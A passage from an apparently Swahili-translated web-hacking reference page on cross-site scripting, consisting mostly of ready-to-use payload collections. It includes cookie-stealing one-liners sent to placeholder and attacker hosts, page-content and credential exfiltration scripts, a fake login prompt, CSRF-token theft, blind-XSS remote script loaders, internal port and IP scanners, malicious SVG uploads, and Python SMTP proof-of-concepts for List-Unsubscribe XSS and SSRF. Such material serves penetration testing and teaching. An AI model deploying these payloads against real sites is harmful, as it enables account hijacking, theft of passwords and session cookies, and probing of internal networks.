(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS payloads za kawaida

### Payloads kadhaa ndani ya 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

Fanya mtumiaji aendelee kuvinjari ukurasa bila kutoka kwenye iframe na steal vitendo vyake (ikijumuisha taarifa zinazotumwa kupitia forms):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Retrieve Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> **Hautaweza kufikia cookies kutoka JavaScript** ikiwa bendera ya HTTPOnly imewekwa kwenye cookie. Lakini hapa una [some ways to bypass this protection](../hacking-with-cookies/index.html#httponly) ikiwa wewe ni mwenye bahati.

### Steal Page Content
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Pata IP za ndani
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Wakati mfupi unaonyesha port inayojibu_ _Wakati mrefu unaonyesha hakuna jibu._

Angalia orodha ya ports zilizokataliwa katika Chrome [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) na katika Firefox [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Sanduku la kuomba maelezo ya kuingia
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Kukamata nywila za kujaza moja kwa moja
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Wakati data yoyote inapowekwa kwenye password field, username na password hutumwa kwenye attackers server; hata kama client atachagua saved password na hajandikii chochote, credentials zitatolewa (ex-filtrated).

### Hijack form handlers to exfiltrate credentials (const shadowing)

Ikiwa handler muhimu (mfano, `function DoLogin(){...}`) imetangazwa baadaye kwenye ukurasa, na payload yako inafanya kazi mapema (mfano, via an inline JS-in-JS sink), unda `const` yenye jina sawa kwanza ili kuzuia na kufunga handler. Matangazo ya function baadaye hayawezi rebind jina la `const`, na hivyo hook yako itabaki kudhibiti:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Vidokezo
- Hii inategemea mpangilio wa utekelezaji: injection yako lazima itekelezwe kabla ya tamko halali.
- Ikiwa payload yako imefungwa katika `eval(...)`, `const/let` bindings hazitageuka kuwa globals. Tumia dynamic `<script>` injection technique kutoka sehemu “Deliverable payloads with eval(atob()) and scope nuances” ili kuhakikisha binding halisi ya global, isiyoweza kurebind.
- Wakati vichujio vya maneno kuu vinazuia code, changanya na Unicode-escaped identifiers au `eval(atob('...'))` delivery, kama ilivyoonyeshwa hapo juu.

### Keylogger

Just searching in github I found a few different ones:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- Unaweza pia kutumia metasploit `http_javascript_keylogger`

### Kuiba CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Kuiba ujumbe za PostMessage
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### PostMessage-origin script loaders (opener-gated)

Ikiwa ukurasa **unahifadhi `event.origin` kutoka kwa `postMessage` na baadaye kuuiunganisha katika URL ya script**, mtumaji anadhibiti **origin** ya JS iliyopakuliwa:
```javascript
window.addEventListener('message', (event) => {
if (event.data.msg_type === 'IWL_BOOTSTRAP') {
localStorage.setItem('CFG', {host: event.origin, pixelID: event.data.pixel_id});
startIWL(); // later loads `${host}/sdk/${pixelID}/iwl.js`
}
});
```
Exploitation recipe (from CAPIG):

- **Gates**: hufanya kazi tu wakati `window.opener` inapatikana na `pixel_id` iko kwenye orodha ya kuruhusiwa; **origin is never checked**.
- **Use CSP-allowed origin**: pinduka kwenda domain ambayo tayari imeruhusiwa na victim CSP (mfano, kurasa za msaada za logged-out zinazoruhusu analytics kama `*.THIRD-PARTY.com`) na uweke `/sdk/<pixel_id>/iwl.js` hapo kupitia takeover/XSS/upload.
- **Restore `opener`**: kwenye Android WebView, `window.name='x'; window.open(target,'x')` hufanya ukurasa uwe opener wake mwenyewe; tuma `postMessage` hasidi kutoka iframe iliyotekwa.
- **Trigger**: the iframe posts `{msg_type:'IWL_BOOTSTRAP', pixel_id:<allowed>}`; the parent then loads attacker `iwl.js` from the CSP-allowed origin and runs it.

This turns origin-less `postMessage` validation into a **remote script loader primitive** that survives CSP if you can land on any origin already allowed by the policy.

### Supply-chain stored XSS via backend JS concatenation

When a backend **builds a shared SDK by concatenating JS strings with user-controlled values**, any quote/structure breaker can inject script that is served to every consumer:

- Example pattern (Meta CAPIG): server appends `cbq.config.set("<pixel>","IWLParameters",{params: <user JSON>});` directly into `capig-events.js`.
- Injecting `'` or `"]}` closes the literal/object and adds attacker JS, creating **stored XSS** in the distributed SDK for every site that loads it (first-party and third-party).

### Stored XSS in generated reports when escaping is disabled

If uploaded files are parsed and their metadata is printed into HTML reports with escaping disabled (`|safe`, custom renderers), that metadata is a **stored XSS sink**. Example flow:
```python
xmlhost = data.getAttribute(f'{ns}:host')
ret_list.append(('dialer_code_found', (xmlhost,), ()))
'title': a_template['title'] % t_name  # %s fed by xmlhost
```
Template ya Django ina-render `{{item|key:"title"|safe}}`, hivyo HTML ya mshambuliaji inaendeshwa.

**Exploit:** weka **entity-encoded HTML** katika sehemu yoyote ya manifest/config inayofika kwenye ripoti:
```xml
<data android:scheme="android_secret_code"
android:host="&lt;img src=x onerror=alert(document.domain)&gt;"/>
```
Rendered with `|safe`, the report outputs `<img ...>` and fires JS on view.

Kutafuta: angalia report/notification builders zinazotumia tena mashamba yaliyotambuliwa katika `%s`/f-strings na kuzima auto-escape. Tag moja iliyosimbwa (encoded) katika manifest/log/archive iliyopakiwa huendeleza XSS kwa kila mtazamaji.

### Abusing Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Accessing Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Unaweza pia kutumia: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Kufikia Yaliyofichwa

Kutoka kwa [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) inawezekana kujifunza kwamba hata ikiwa baadhi ya values zinaondoka kutoka JS, bado inawezekana kuzipata katika JS attributes katika objects tofauti. Kwa mfano, input ya REGEX bado inawezekana kuipata baada ya value ya input ya regex kuondolewa:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Orodha ya Brute-Force


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS Kutumia udhaifu mwingine

### XSS katika Markdown

Unaweza kuingiza msimbo wa Markdown utakao-render? Labda unaweza kupata XSS! Angalia:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS to SSRF

Je, umepata XSS kwenye **tovuti inayotumia kache**? Jaribu **kuiboresha kuwa SSRF** kupitia Edge Side Include Injection kwa payload hii:
```python
<esi:include src="http://yoursite.com/capture" />
```
Tumia hii kuvuka cookie restrictions, XSS filters na mengi zaidi!\
More information about this technique here: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS katika PDF zinazotengenezwa dinamiki

Ikiwa ukurasa wa wavuti unaunda PDF kwa kutumia input iliyodhibitiwa na mtumiaji, unaweza kujaribu kudanganya bot inayotengeneza PDF ili itekeleze arbitrary JS code.\
Hivyo, ikiwa PDF creator bot itapata aina yoyote ya HTML tags, itayatafsiri, na unaweza kutumia tabia hii vibaya kusababisha Server XSS.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

Ikiwa huwezi kuingiza HTML tags inaweza kuwa vyema kujaribu **kuingiza PDF data**:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

AMP, inayolenga kuharakisha utendaji wa kurasa za wavuti kwenye vifaa vya rununu, inajumuisha HTML tags zilizounganishwa na JavaScript ili kuhakikisha utendakazi kwa msisitizo kwenye kasi na usalama. Inasaidia aina mbalimbali za components kwa vipengele tofauti, vinavyopatikana kupitia [AMP components](https://amp.dev/documentation/components/?format=websites).

The [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) format extends specific AMP components to emails, enabling recipients to interact with content directly within their emails.

Mfano: [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

Header ya RFC 2369 `List-Unsubscribe` inaweka URIs zinazodhibitiwa na mshambulizi ambazo webmail nyingi na mail clients hubadilisha moja kwa moja kuwa vitufe vya "Unsubscribe". Wakati URIs hizo zinapochorwa au kupakiwa bila uhalalishaji, header inakuwa eneo la injection kwa ajili ya stored XSS (ikiwa kiungo cha unsubscribe kimewekwa kwenye DOM) na SSRF (ikiwa server inafanya ombi la unsubscribe kwa niaba ya mtumiaji).

#### Stored XSS via `javascript:` URIs

1. **Tuma barua pepe kwako mwenyewe** ambapo header inaonyesha `javascript:` URI huku sehemu nyingine ya ujumbe ikiwa haina hatari ili spam filters zisizuiye.
2. **Hakiki kuwa UI inatoa thamani hiyo** (clients nyingi zinaonyesha kwenye kidirisha cha "List Info") na angalia kama tag ya `<a>` itokanayo inapata attributes zinazodhibitiwa na mshambulizi kama `href` au `target`.
3. **Chochea utekelezaji** (mfano, CTRL+click, middle-click, au "open in new tab") wakati kiungo kinapotumia `target="_blank"`; browsers zitateua JavaScript iliyotolewa katika origin ya application ya webmail.
4. Angalia primitive ya stored-XSS: payload inadumu ndani ya email na inahitaji tu bonyeza ili itekelezwe.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
Byte ya newline (`%0a`) katika URI inaonyesha kwamba hata characters zisizo za kawaida zinaendelea kupita kwenye rendering pipeline katika vulnerable clients kama Horde IMP H5, ambazo zitaonyesha string hiyo verbatim ndani ya anchor tag.

<details>
<summary>PoC ndogo ya SMTP inayosambaza header ya List-Unsubscribe yenye madhara</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### Proxy za unsubscribe upande wa server -> SSRF

Baadhi ya clients, kama vile Nextcloud Mail app, hupitisha kitendo cha unsubscribe upande wa server: kubofya kitufe huelekeza server kujipatia URL iliyotolewa. Hii inageuza header kuwa primitive ya SSRF, hasa wakati wasimamizi wanapoweka `'allow_local_remote_servers' => true` (imeandikwa katika [HackerOne report 2902856](https://hackerone.com/reports/2902856)), ambayo inaruhusu maombi kuelekea loopback na RFC1918 ranges.

1. **Craft an email** where `List-Unsubscribe` targets an attacker-controlled endpoint (for blind SSRF use Burp Collaborator / OAST).
2. **Keep `List-Unsubscribe-Post: List-Unsubscribe=One-Click`** ili UI ionyeshe kitufe cha unsubscribe cha kubofya mara moja.
3. **Satisfy trust requirements**: Nextcloud, kwa mfano, hufanya tu maombi ya HTTPS ya unsubscribe pale ujumbe unapopita DKIM, hivyo attacker lazima aisaini barua pepe kwa kutumia domain wanayodhibiti.
4. **Deliver the message to a mailbox processed by the target server** na subiri hadi mtumiaji abofye kitufe cha unsubscribe.
5. **Observe the server-side callback** kwenye collaborator endpoint, kisha pivot kwa anwani za ndani mara primitive imethibitishwa.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>Ujumbe wa DKIM-signed List-Unsubscribe kwa ajili ya kujaribu SSRF</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**Vidokezo vya Upimaji**

- Tumia endpoint ya OAST kukusanya hits za blind SSRF, kisha badilisha URL ya `List-Unsubscribe` ili kulenga `http://127.0.0.1:PORT`, metadata services, au mahosti mengine ya ndani mara tu primitive itakapothibitishwa.
- Kwa sababu unsubscribe helper mara nyingi hutumia tena HTTP stack ile ile kama application, unarithi proxy settings zake, HTTP verbs, na header rewrites, jambo linalowezesha mbinu zaidi za traversal zilizotajwa katika [SSRF methodology](../ssrf-server-side-request-forgery/README.md).

### Kupakia faili za XSS (svg)

Pakia kama picha faili kama ifuatayo (kutoka [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
